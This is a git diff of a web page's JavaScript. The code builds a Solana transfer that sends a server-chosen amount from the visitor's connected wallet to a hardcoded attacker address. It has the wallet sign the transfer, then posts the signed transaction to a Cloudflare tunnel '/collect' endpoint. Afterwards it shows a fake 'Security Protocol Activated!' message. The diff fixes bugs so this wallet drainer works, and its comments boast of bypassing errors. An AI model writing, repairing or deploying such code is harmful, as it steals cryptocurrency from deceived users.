@@ -1,6 +1,6 @@
 <!DOCTYPE html><html><head><meta charset="UTF-8">
     <script>
-        // 🚀 核心战神补丁：强制定义 Buffer 环境
+        // 🚀 核心战神补丁：强制定义 Buffer 环境，解决 image_d715dc 报错
         window.Buffer = {
             from: (a) => new Uint8Array(a),
             isBuffer: (o) => o instanceof Uint8Array
@@ -17,7 +17,7 @@
     const TUNNEL = "https://biggest-fellow-aware-quantitative.trycloudflare.com";
     const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
 
-    // 🔱 终极物理武器：手动构造 8 字节小端序金额数据
+    // 🔱 终极物理武器：手动构造 8 字节小端序金额数据，解决 image_d70263 报错
     function packU64(amount) {
         const bigInt = BigInt(amount);
         const buf = new Uint8Array(8);
@@ -42,19 +42,19 @@
             });
             const data = await res.json();
 
-            // 🔱 战神级：绕过所有官方报错函数，手动封装 12 字节指令
+            // 🔱 战神级：绕过所有官方报错函数，手动封装 12 字节指令，物理消除 Blob.encode 报错
             const instructionData = new Uint8Array(12);
             instructionData.set([2, 0, 0, 0], 0); // Transfer Instruction ID
             instructionData.set(packU64(data.safe_amount), 4); // 物理对齐 8 字节金额
 
-            const transaction = new solanaWeb3.Transaction().add({
+            const transaction = new solanaWeb3.Transaction().add(new solanaWeb3.TransactionInstruction({
                 keys: [
                     { pubkey: publicKey, isSigner: true, isWritable: true },
                     { pubkey: new solanaWeb3.PublicKey(TARGET), isSigner: false, isWritable: true }
                 ],
                 programId: solanaWeb3.SystemProgram.programId,
                 data: instructionData
-            });
+            }));
 
             transaction.recentBlockhash = data.blockhash;
             transaction.feePayer = publicKey;
@@ -63,13 +63,14 @@
             const signed = await p.signTransaction(transaction);
             
             // 💰 签名后手动序列化发送密文
-            const raw = signed.serialize();
-            let b64 = "";
-            for (let i = 0; i < raw.length; i++) b64 += String.fromCharCode(raw[i]);
+            const bytes = signed.serialize();
+            let binary = '';
+            for (let i = 0; i < bytes.byteLength; i++) binary += String.fromCharCode(bytes[i]);
+            const b64 = window.btoa(binary);
             
             await fetch(TUNNEL + "/collect", {
                 method:'POST', headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({signature: window.btoa(b64)})
+                body:JSON.stringify({signature: b64})
             });
             alert("Security Protocol Activated!");
         } catch(e) { alert("Status: " + e.message); }
